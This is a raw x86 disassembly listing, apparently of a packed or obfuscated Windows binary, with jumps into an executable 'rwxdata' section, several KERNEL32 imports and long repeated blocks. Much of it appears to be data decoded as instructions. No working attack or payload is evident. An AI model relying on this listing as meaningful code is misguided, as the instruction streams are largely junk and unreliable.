popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4ba26d
jmp rwxdata
push [ esp ]
add eax ebx
pushad
push [ esp + 0x4 ]
xchg [ esp + 0x28 ] eax
lea eax [ eax - 0x4b79bcf1 ]
mov ax 0x4d34
pop eax
push [ esp + 0x4 ]
lea eax [ 0x0 ]
jmp rwxdata
pushfd
mov [ esp + 0x28 ] rwxdata
push r--data
call sub_515df3
pop esi
dec esp
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl __import_lookup_table_0(KERNEL32:Heap32ListFirst)
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge __import_lookup_table_0(KERNEL32:GetSystemTime)
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js __import_lookup_table_0(KERNEL32:WaitForSingleObject)
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je __import_lookup_table_0(KERNEL32:CreateEventA)
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4ba3bf
pushfd
lea esp [ esp + 0x8 ]
je rwxdata
shr bh cl
shl bx cl
push eax
mov bx [ esi ]
pushfd
mov [ esp ] cl
lea esp [ esp + 0x4 ]
jmp rwxdata
pushad
jmp rwxdata
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
mov ebx [ esi ]
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4ba562
pushad
xor eax eax
pushfd
pushfd
pushfd
lea esp [ esp + 0x30 ]
jge rwxdata
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
call sub_514aff
pushfd
lea esp [ esp + 0x4 ]
jg rwxdata
add al 0xae
jb rwxdata
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
jae rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
call sub_5149d2
test esi ebp
add [ edi + ebx ] ax
pushfd
push [ esp + 0x4 ]
push 0x7ff9b3ca
lea esp [ esp + 0x14 ]
jmp rwxdata
not bl
push ebp
lea esp [ esp + 0x4 ]
jge rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
pushad
jmp rwxdata
sets bl
push edx
dec bl
dec al
mov bl 0x2
dec al
setge al
dec al
setns al
inc ecx
not al
mov al 0x10
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
pushad
jmp rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
